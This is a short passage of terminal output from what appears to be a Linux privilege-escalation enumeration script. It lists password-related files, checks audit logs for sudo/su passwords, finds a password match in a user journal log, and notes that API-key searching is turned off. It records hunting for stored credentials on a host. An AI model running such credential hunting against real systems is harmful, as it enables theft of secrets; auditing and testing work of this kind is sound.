/bin/systemd-tty-ask-password-agent
/etc/brlapi.key
/etc/pam.d/common-password
/etc/pam.d/gdm-password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                        
╔══════════╣ Searching passwords inside logs (limit 70)
Binary file /var/log/journal/1456d592d9a64495ba5b92bdbdb0cc08/user-1000.journal matches                                                                                                 



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                                                      
                                ╚════════════════╝                                                                                                                                      
Regexes to search for API keys aren't activated, use param '-r' 
